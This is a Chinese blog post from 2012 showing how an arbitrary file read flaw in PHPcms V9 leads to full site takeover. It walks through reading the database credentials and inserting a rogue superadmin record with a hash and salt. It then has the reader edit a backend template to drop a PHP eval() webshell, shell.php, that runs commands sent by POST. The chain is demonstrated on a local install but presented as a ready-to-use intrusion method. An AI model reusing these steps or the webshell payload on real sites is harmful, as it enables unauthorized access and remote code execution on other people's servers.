title: "PHPcmsV9任意文件读取漏洞拿Shell"
id: 171
date: 2012-07-29 02:33:37
tags: 
- phpcmsv9漏洞
- webshell
categories: 
- 原创作品
- 技术文章
- 最新漏洞
---

前几天爆的phpcmsV9任意文件读取漏洞，其实危害是很大的，但往往还是一些管理员

觉得漏洞并不可怕，听到某人说道，即使是被人读取了数据库数据也没用，为啥，因为

他权限数据库权限单库单用户，并且v9制作前台cms发布里面就只有管理员账户并且不发

分子拿到密码也没用因为破解不了他的密码，其实我想说你丫的把黑阔当傻子？你能想到

的别人想不到，废话就不说了，看着就是了~~

本地搭建的phpcsmV9.现用漏洞或者工具读取数据库信息：

[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg "v9shell_1")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg)

<!--more-->
数据库phpcmsv9用户名：root  密码为空

我们用一款数据库管理工具连接数据库我用的是navicat

打开工具点击连接-mysql配置数据库信息如图：

[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg "v9shell_2")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg)

打开phpcmsV9数据库并且找到admin表，向表中添加一条数据，因为我们没法破解他的密码那么咱们就自己

添加一个用户以便能够登录后台操作：

>Username:admin password: 748b4dfa3a7159c1eb1baa46f222f9b8 roleid:1 encrypt:C6mB9p

注意这几项必须添负责登录不了的。应为这条记录的意思是添加用户名为admin,密码为：creturn.com的超级管理员

[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg "v9shell_3")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg)

>后台登录地址：localhost/index.php?m=admin

>用户名：admin 密码：creturn.com

登录后台后我们找到界面-》模版风格-》选择默认模版点击详情列表

[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_41-1024x163.jpg "v9shell_4")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_41.jpg)

然后点击里面的search目录下面的index.html右侧的编辑

[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg "v9shell_5")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg)

修改其模版为：

```php
<?php $shell = '<?php @eval($_POST[cmd]);';file_put_contents('shell.php',$shell);?>
```

提交保存

然后访问：localhost/index.php?m=search

会在根目录生成一个shell.php的一句话，我们连接看看

[![](http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg "v9shell_6")](http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg)

可以看到已经拿到shell，记得把修改的模版改回去。

至此，如果还有管理员认为这个漏洞是鸡肋，那我就无话可说了！

最近发现有人那我写的Exp改作者名和版权信息后发到自己的站上，等我有时间了会光顾你们的！
